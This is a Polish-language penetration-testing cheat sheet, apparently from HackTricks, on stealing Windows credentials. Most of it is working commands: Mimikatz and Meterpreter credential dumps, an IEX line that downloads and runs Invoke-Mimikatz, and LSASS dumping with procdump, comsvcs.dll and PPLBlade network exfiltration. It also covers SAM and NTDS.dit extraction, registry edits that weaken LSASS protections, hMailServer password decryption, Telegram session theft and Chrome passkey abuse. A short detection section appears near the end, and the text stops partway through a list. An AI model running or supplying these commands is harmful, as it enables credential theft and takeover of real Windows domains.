# Kradzież poświadczeń Windows

{{#include ../../banners/hacktricks-training.md}}

## Poświadczenia Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Znajdź inne rzeczy, które Mimikatz potrafi robić na** [**tej stronie**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Dowiedz się tutaj o niektórych możliwych zabezpieczeniach danych uwierzytelniających.**](credentials-protections.md) **Te zabezpieczenia mogą uniemożliwić Mimikatz wyodrębnienie niektórych danych uwierzytelniających.**

## Dane uwierzytelniające w Meterpreterze

Użyj [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), który stworzyłem, aby **wyszukiwać hasła i hashe** wewnątrz zaatakowanego systemu.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Omijanie AV

### Procdump + Mimikatz

Ponieważ **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**jest legalnym narzędziem Microsoft**, Defender go nie wykrywa.\
Możesz użyć tego narzędzia do **zrzucenia procesu lsass**, **pobrania dumpa** i **wyodrębnienia** **danych uwierzytelniających lokalnie** z dumpa.

Możesz również użyć [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Proces ten jest wykonywany automatycznie za pomocą [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Uwaga**: Niektóre programy **AV** mogą **wykrywać** jako **złośliwe** użycie **procdump.exe do zrzutu lsass.exe**, ponieważ **wykrywają** ciągi **„procdump.exe” i „lsass.exe”**. Dlatego bardziej **stealthy** jest przekazanie jako **argumentu** **PID** procesu lsass do procdump **zamiast** **nazwy lsass.exe**.

### Zrzucanie lsass za pomocą **comsvcs.dll**

Biblioteka DLL o nazwie **comsvcs.dll**, znajdująca się w `C:\Windows\System32`, odpowiada za **zrzucanie pamięci procesu** w przypadku awarii. Ta biblioteka zawiera **funkcję** o nazwie **`MiniDumpW`**, przeznaczoną do wywoływania za pomocą `rundll32.exe`.\
Użycie dwóch pierwszych argumentów nie ma znaczenia, natomiast trzeci jest podzielony na trzy elementy. Identyfikator procesu, który ma zostać zrzucony, stanowi pierwszy element, lokalizacja pliku zrzutu stanowi drugi, a trzeci element to dokładnie słowo **full**. Nie istnieją żadne alternatywne opcje.\
Po przeanalizowaniu tych trzech elementów biblioteka DLL rozpoczyna tworzenie pliku zrzutu i przenosi do niego pamięć określonego procesu.\
Wykorzystanie **comsvcs.dll** umożliwia zrzucenie procesu lsass, eliminując tym samym konieczność przesyłania i wykonywania procdump. Metoda ta została szczegółowo opisana na stronie [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Do wykonania używa się następującego polecenia:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Ten proces możesz zautomatyzować za pomocą** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Zrzucanie lsass za pomocą Menedżera zadań**

1. Kliknij prawym przyciskiem myszy pasek zadań i kliknij Menedżer zadań
2. Kliknij Więcej szczegółów
3. Na karcie Procesy wyszukaj proces „Local Security Authority Process”
4. Kliknij prawym przyciskiem myszy proces „Local Security Authority Process” i kliknij „Utwórz plik zrzutu”.

### Zrzucanie lsass za pomocą procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) to plik binarny podpisany przez Microsoft, który jest częścią pakietu [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpowanie lsass za pomocą PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) to narzędzie do zrzutu chronionych procesów, które obsługuje obfuskację zrzutu pamięci i przesyłanie go na zdalne stacje robocze bez zapisywania go na dysku.

**Kluczowe funkcje**:

1. Omijanie ochrony PPL
2. Obfuskacja plików zrzutów pamięci w celu uniknięcia mechanizmów wykrywania opartych na sygnaturach programu Defender
3. Przesyłanie zrzutu pamięci metodami RAW i SMB bez zapisywania go na dysku (zrzut bez pliku)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – zrzut LSASS oparty na SSP bez MiniDumpWriteDump

Ink Dragon zawiera trzyetapowy dumper o nazwie **LalsDumper**, który nigdy nie wywołuje `MiniDumpWriteDump`, dzięki czemu hooki EDR na tym API nigdy się nie uruchamiają:<sup>[[3]](#references)</sup>

1. **Loader Stage 1 (`lals.exe`)** – przeszukuje `fdp.dll` w poszukiwaniu placeholdera składającego się z 32 małych liter `d`, zastępuje go absolutną ścieżką do `rtu.txt`, zapisuje zmodyfikowaną bibliotekę DLL jako `nfdp.dll` i wywołuje `AddSecurityPackageA("nfdp","fdp")`. Zmusza to **LSASS** do załadowania złośliwej biblioteki DLL jako nowego Security Support Provider (SSP).
2. **Stage 2 wewnątrz LSASS** – gdy LSASS ładuje `nfdp.dll`, biblioteka DLL odczytuje `rtu.txt`, wykonuje XOR każdego bajtu z `0x20` i mapuje zdekodowany blob do pamięci przed przekazaniem wykonania.
3. **Stage 3 dumper** – zmapowany payload odtwarza logikę MiniDump za pomocą **bezpośrednich wywołań systemowych** rozwiązywanych na podstawie zahashowanych nazw API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Dedykowany export o nazwie `Tom` otwiera `%TEMP%\<pid>.ddt`, zapisuje skompresowany zrzut LSASS do pliku w trybie strumieniowym i zamyka uchwyt, aby exfiltracja mogła nastąpić później.

Uwagi dla operatora:

* Trzymaj `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` w tym samym katalogu. Stage 1 zastępuje hard-coded placeholder absolutną ścieżką do `rtu.txt`, więc ich rozdzielenie przerywa łańcuch.
* Rejestracja odbywa się przez dopisanie `nfdp` do `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Możesz samodzielnie ustawić tę wartość, aby wymusić ponowne ładowanie SSP przez LSASS przy każdym uruchomieniu systemu.
* Pliki `%TEMP%\*.ddt` zawierają skompresowane zrzuty. Rozpakuj je lokalnie, a następnie przekaż do Mimikatz/Volatility w celu wyodrębnienia poświadczeń.
* Uruchomienie `lals.exe` wymaga praw administratora/SeTcb, aby `AddSecurityPackageA` zakończyło się powodzeniem; po zakończeniu wywołania LSASS przejrzyście ładuje rogue SSP i wykonuje Stage 2.
* Usunięcie biblioteki DLL z dysku nie usuwa jej z LSASS. Usuń wpis w rejestrze i uruchom ponownie LSASS (restart systemu) albo pozostaw go w celu długoterminowej persistence.

## CrackMapExec

### Zrzut hashy SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Zrzut sekretów LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Zrzut NTDS.dit z docelowego kontrolera domeny
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Zrzut historii haseł z pliku NTDS.dit na docelowym kontrolerze domeny
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Pokaż atrybut pwdLastSet dla każdego konta NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Kradzież SAM i SYSTEM

Pliki te powinny być **zlokalizowane** w _C:\windows\system32\config\SAM_ oraz _C:\windows\system32\config\SYSTEM._ Jednak **nie można ich po prostu skopiować w zwykły sposób**, ponieważ są chronione.

### Z rejestru

Najłatwiejszym sposobem kradzieży tych plików jest uzyskanie ich kopii z rejestru:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pobierz** te pliki na swoją maszynę Kali i **wyodrębnij hashe** za pomocą:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Kopia woluminów w tle

Za pomocą tej usługi można kopiować chronione pliki. Wymagane są uprawnienia Administratora.

#### Using vssadmin

Plik binarny vssadmin jest dostępny wyłącznie w wersjach Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ale możesz zrobić to samo z poziomu **Powershell**. Jest to przykład **kopiowania pliku SAM** (używany dysk to „C:”, a plik zostanie zapisany w C:\users\Public), ale możesz użyć tego do kopiowania dowolnego chronionego pliku:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Na koniec możesz również użyć [**skryptu PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), aby utworzyć kopię SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Poświadczenia Active Directory - NTDS.dit**

Plik **NTDS.dit** jest znany jako serce **Active Directory** i przechowuje kluczowe dane dotyczące obiektów użytkowników, grup oraz ich członkostwa. To tutaj przechowywane są **hashes haseł** użytkowników domeny. Ten plik jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się w lokalizacji **_%SystemRoom%/NTDS/ntds.dit_**.

W tej bazie danych utrzymywane są trzy główne tabele:

- **Data Table**: Ta tabela przechowuje szczegóły dotyczące obiektów, takich jak użytkownicy i grupy.
- **Link Table**: Śledzi relacje, takie jak członkostwo w grupach.
- **SD Table**: Przechowuje tutaj **security descriptors** każdego obiektu, zapewniając bezpieczeństwo i kontrolę dostępu do przechowywanych obiektów.

Badania Christoffera Anderssona dotyczące warstwy bazy danych dokładniej opisują te tabele oraz ich zachowanie zależne od wersji.<sup>[[8]](#references)</sup>

Windows używa _Ntdsa.dll_ do interakcji z tym plikiem, a korzysta z niego _lsass.exe_. Następnie **część** pliku **NTDS.dit** może znajdować się w pamięci **`lsass`** (prawdopodobnie można znaleźć tam ostatnio używane dane dzięki poprawie wydajności wynikającej z użycia **cache**).

#### Odszyfrowywanie hashes w pliku NTDS.dit

Hash jest szyfrowany trzykrotnie:

1. Odszyfrowanie klucza szyfrowania haseł (**PEK**) przy użyciu **BOOTKEY** i **RC4**.
2. Odszyfrowanie **hasha** przy użyciu **PEK** i **RC4**.
3. Odszyfrowanie **hasha** przy użyciu **DES**.

**PEK** ma **taką samą wartość na każdym kontrolerze domeny**, ale jest **zaszyfrowany** w pliku **NTDS.dit** przy użyciu właściwego dla kontrolera domeny **BOOTKEY** z gałęzi **SYSTEM** tego kontrolera domeny. Dlatego wyodrębnianie poświadczeń wymaga zarówno pliku **NTDS.dit**, jak i **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Kopiowanie NTDS.dit za pomocą Ntdsutil

Dostępne od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Możesz również użyć sztuczki [**volume shadow copy**](#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że będziesz również potrzebować kopii pliku **SYSTEM** (ponownie, [**zrzucić go z rejestru lub użyć sztuczki volume shadow copy**](#stealing-sam-and-system)).

### **Wyodrębnianie hashy z NTDS.dit**

Po **uzyskaniu** plików **NTDS.dit** i **SYSTEM** możesz użyć narzędzi takich jak _secretsdump.py_, aby **wyodrębnić hashe**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Możesz również **automatycznie je wyodrębnić** przy użyciu prawidłowego użytkownika administratora domeny:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
W przypadku **dużych plików NTDS.dit** zaleca się ich wyodrębnianie za pomocą [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Ostatecznie można również użyć **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ lub **mimikatz** `lsadump::lsa /inject`

### **Wyodrębnianie obiektów domeny z NTDS.dit do bazy danych SQLite**

Obiekty NTDS można wyodrębnić do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Wyodrębniane są nie tylko sekrety, ale również całe obiekty i ich atrybuty, co umożliwia dalsze pozyskiwanie informacji po pobraniu surowego pliku NTDS.dit.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Hive `SYSTEM` jest opcjonalny, ale umożliwia odszyfrowanie secrets (hashy NT i LM, dodatkowych poświadczeń, takich jak hasła w cleartext, klucze Kerberos lub trust, a także historii haseł NT i LM). Oprócz innych informacji wyodrębniane są następujące dane: konta użytkowników i komputerów wraz z ich hashami, flagi UAC, znacznik czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i członkostwa rekurencyjne, drzewo jednostek organizacyjnych i członkostwo, zaufane domeny wraz z typem, kierunkiem i atrybutami trustów...

## Lazagne

Pobierz binary [stąd](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tego binary do wyodrębniania credentials z różnych software.
```
lazagne.exe all
```
## Inne narzędzia do wyodrębniania poświadczeń z SAM i LSASS

### Windows credentials Editor (WCE)

To narzędzie może służyć do wyodrębniania poświadczeń z pamięci. Pobierz je z: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Wyodrębnianie poświadczeń z pliku SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Wyodrębnianie danych uwierzytelniających z pliku SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Pobierz go z:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i po prostu **uruchom**, a hasła zostaną wyodrębnione.

## Zbieranie informacji o bezczynnych sesjach RDP i osłabianie mechanizmów zabezpieczeń

RAT Ink Dragon’s FinalDraft zawiera tasker `DumpRDPHistory`, którego techniki są przydatne dla każdego członka red teamu:<sup>[[3]](#references)</sup>

### Zbieranie danych telemetrycznych w stylu DumpRDPHistory

* **Docelowe systemy outbound RDP** – przeanalizuj każdy hive użytkownika pod adresem `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Każdy podklucz przechowuje nazwę serwera, `UsernameHint` oraz znacznik czasu ostatniej modyfikacji. Możesz odtworzyć logikę FinalDraft za pomocą PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Ślady inbound RDP** – odpytywanie logu `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pod kątem identyfikatorów zdarzeń **21** (pomyślne logowanie) i **25** (rozłączenie) pozwala ustalić, kto administrował komputerem:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Gdy już ustalisz, który Domain Admin regularnie się łączy, zrzutuj LSASS (za pomocą LalsDumper/Mimikatz), dopóki jego **rozłączona** sesja nadal istnieje. CredSSP + fallback NTLM pozostawia jego verifier i tokeny w LSASS, które można następnie ponownie wykorzystać przez SMB/WinRM, aby pobrać `NTDS.dit` lub ustanowić persistence na kontrolerach domeny.

### Obniżanie zabezpieczeń rejestru ukierunkowane przez FinalDraft

Ten sam implant modyfikuje również kilka kluczy rejestru, aby ułatwić kradzież poświadczeń:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Ustawienie `DisableRestrictedAdmin=1` wymusza pełne ponowne użycie danych uwierzytelniających/biletów podczas RDP, umożliwiając pivoty w stylu pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` wyłącza filtrowanie tokenów UAC, dzięki czemu lokalni administratorzy otrzymują nieograniczone tokeny przez sieć.
* `DSRMAdminLogonBehavior=2` umożliwia administratorowi DSRM logowanie się, gdy DC jest online, zapewniając atakującym kolejne wbudowane konto o wysokich uprawnieniach.
* `RunAsPPL=0` usuwa zabezpieczenia LSASS PPL, dzięki czemu dostęp do pamięci staje się banalny dla dumperów takich jak LalsDumper.

## Dane uwierzytelniające bazy danych hMailServer (po przejęciu)

hMailServer przechowuje hasło do DB w pliku `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` pod `[Database] Password=`. Wartość jest zaszyfrowana za pomocą Blowfish ze statycznym kluczem `THIS_KEY_IS_NOT_SECRET` i zamianami endianowości 4-bajtowych słów. Użyj ciągu hex z pliku INI wraz z tym fragmentem Python:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Mając hasło w jawnym tekście, skopiuj bazę danych SQL CE, aby uniknąć blokad pliku, załaduj dostawcę 32-bitowego i w razie potrzeby wykonaj aktualizację przed odpytywaniem o hashe:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Kolumna `accountpassword` używa formatu hashy hMailServer (tryb hashcat `1421`). Łamanie tych wartości może dostarczyć danych uwierzytelniających wielokrotnego użytku do pivotów WinRM/SSH.

## Przechwytywanie wywołania zwrotnego logowania LSA (LsaApLogonUserEx2)

Niektóre narzędzia przechwytują **hasła logowania w plaintext**, przechwytując wywołanie zwrotne logowania LSA `LsaApLogonUserEx2`. Idea polega na podpięciu hooka lub opakowaniu wywołania zwrotnego pakietu uwierzytelniania, aby dane uwierzytelniające zostały przechwycone **podczas logowania** (przed hashowaniem), a następnie zapisane na dysku lub zwrócone operatorowi. Zwykle jest to implementowane jako narzędzie pomocnicze, które wstrzykuje się do LSA lub rejestruje w nim, a następnie rejestruje każde pomyślne zdarzenie logowania interaktywnego/sieciowego wraz z nazwą użytkownika, domeną i hasłem.<sup>[[1]](#references)</sup>

Uwagi operacyjne:
- Wymagane są lokalne uprawnienia administratora/SYSTEM, aby załadować narzędzie pomocnicze do ścieżki uwierzytelniania.
- Przechwycone dane uwierzytelniające pojawiają się tylko w momencie wystąpienia logowania (interaktywnego, RDP, usługi lub sieciowego — zależnie od hooka).

## Zapisane dane uwierzytelniające połączeń SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) przechowuje zapisane informacje o połączeniach w pliku `sqlstudio.bin` przypisanym do użytkownika. Dedykowane narzędzia do dumpowania mogą analizować plik i odzyskiwać zapisane dane uwierzytelniające SQL. W powłokach, które zwracają wyłącznie wynik polecenia, plik jest często eksfiltrowany przez zakodowanie go jako Base64 i wypisanie do stdout.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Po stronie operatora odbuduj plik i uruchom lokalnie dumper, aby odzyskać dane uwierzytelniające:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Kradzież sesji `tdata` w Telegram Desktop

Telegram Desktop przechowuje stan autoryzacji i konta w swoim katalogu **`tdata`**. Skopiowaną sesję można załadować przy użyciu kompatybilnych narzędzi, aby uwierzytelnić się bez hasła do konta, dopóki ta autoryzacja pozostaje ważna; jeśli włączone jest szyfrowanie danych lokalnych, stealer potrzebuje również kodu dostępu. Uwierzytelniona sesja może następnie ujawnić dane tożsamości, metadane dialogów i członkostwa, wiadomości oraz multimedia możliwe do pobrania.<sup>[[10]](#references)</sup>

### Wykrywanie i pozyskiwanie

Przeszukaj zarówno układy zainstalowane, jak i portable; nazwy pakietów Microsoft Store mogą się różnić, dlatego wylicz katalogi pakietów zawierające `TelegramMessenge` i sprawdź ich poddrzewo `LocalCache\Roaming`.<sup>[[10]](#references)</sup>
```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
Where-Object Name -Like '*TelegramMessenge*' |
ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```
Jeśli zwykłe odczyty kończą się niepowodzeniem, a token procesu **już zawiera i ma włączony** `SeBackupPrivilege`, dostęp uwzględniający tryb backupu zapewnia rozwiązanie awaryjne; nie uzyskuje on tego uprawnienia ani nie podnosi uprawnień procesu. `CreateFileW` z `FILE_FLAG_BACKUP_SEMANTICS` może zażądać semantyki backupu/przywracania i pominąć kontrole bezpieczeństwa pliku, gdy wymagane uprawnienia tokenu są obecne, ale sama flaga nie omija niezgodnej blokady współdzielenia.<sup>[[10]](#references)[[11]](#references)</sup>

W przypadku aktualnie zablokowanych plików utwórz **Volume Shadow Copy**; w przypadku plików zablokowanych przez ACL `robocopy /B` używa trybu backupu i omija ACL plików oraz katalogów.<sup>[[10]](#references)[[12]](#references)</sup>
```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```
Implant świadomy ograniczeń przepustowości może najpierw przesłać wyłącznie inwentarz ścieżek plików, otrzymać identyfikator migawki oraz ścieżki już przechowywane przez C2, a następnie przesłać tylko brakujące pliki. Dlatego niewielkie transfery przyrostowe po rekurencyjnym wyliczeniu `tdata` nadal mogą oznaczać skuteczną kradzież sesji.<sup>[[10]](#references)</sup>

### Wykrywanie i ograniczanie skutków

Koreluj rekurencyjny dostęp do `tdata` przez proces niebędący Telegramem z włączeniem `SeBackupPrivilege`, otwieraniem plików z semantyką kopii zapasowej, aktywnością VSS lub procesem potomnym `robocopy.exe` używającym `/B`. Wyszukuj również szybkie wyliczanie zawartości zarówno `%APPDATA%`, jak i `%LOCALAPPDATA%\Packages`, po którym następują połączenia wychodzące z tego samego procesu. Po naruszeniu bezpieczeństwa użyj **Ustawienia → Urządzenia** (lub **Prywatność i bezpieczeństwo → Aktywne sesje**), aby zakończyć nierozpoznane sesje; samo włączenie weryfikacji dwuetapowej nie unieważnia autoryzacji, która została już skradziona.<sup>[[10]](#references)[[13]](#references)</sup>

## Kradzież poświadczeń Passkeys / WebAuthn z Chrome w Windows

Jeśli na hoście Windows uzyskano wykonanie kodu jako **użytkownik będący ofiarą**, a używany jest **Chrome + passkeys zsynchronizowane z Google Password Manager**, passkeys stają się interesującym celem post-exploitation, nawet **bez uprawnień administratora/SYSTEM**.<sup>[[4]](#references)</sup>

### Interesujące artefakty lokalne
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** przechowuje zakodowane w protobuf rekordy **`WebauthnCredentialSpecifics`**. Proces tego samego użytkownika może wyliczyć **RP ID**, **username**, **credential ID** oraz zaszyfrowany materiał klucza prywatnego dla zsynchronizowanych passkeys.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** przechowuje lokalny stan rejestracji urządzenia, taki jak **`wrapped_identity_private_key`** oraz opakowany sekret używany do odzyskiwania zsynchronizowanych poświadczeń.<sup>[[4]](#references)</sup>

Szybki triage:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### Powiązane z TPM obiekty kluczy mogą nadal być nadużywane jako lokalny signing oracle

Jeśli przeglądarka eksportuje klucz tożsamości wspierany przez TPM jako **`NCRYPT_OPAQUE_KEY_BLOB`** i przechowuje ten blob w stanie dostępnym dla użytkownika, malware **nie musi wyodrębniać surowego klucza prywatnego**. Może po prostu ponownie zaimportować blob na **tej samej maszynie** i poprosić lokalny TPM o podpisanie danych kontrolowanych przez atakującego:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Oznacza to, że **wiązanie ze sprzętem zapobiega eksportowi poza urządzenie, ale nie uniemożliwia użycia przez tego samego użytkownika na zaatakowanym endpointcie**.

### Praktyczne ścieżki nadużyć

1. **Przekazywanie pass-ta-key / device-identity**<sup>[[4]](#references)</sup>
- Wylicz `WebauthnCredentialSpecifics` z LevelDB przeglądarki Chrome.
- Rozpocznij logowanie za pomocą passkey i uzyskaj nowy challenge WebAuthn.
- Użyj skradzionego bloku `wrapped_identity_private_key` na TPM ofiary, aby podpisać binding żądania cloud-authenticator.
- Przekaż zwrócone assertion do relying party.
- Jest to szczególnie cenne, gdy RP akceptuje `userVerification=preferred` lub nie odrzuca assertions z **`UV=0`**.
2. **Przejęcie pending UV-key**<sup>[[4]](#references)</sup>
- Wymuś ponowne onboardowanie, usuwając `passkey_enclave_state` lub wysyłając prawidłowo podpisaną operację `device/forget`.
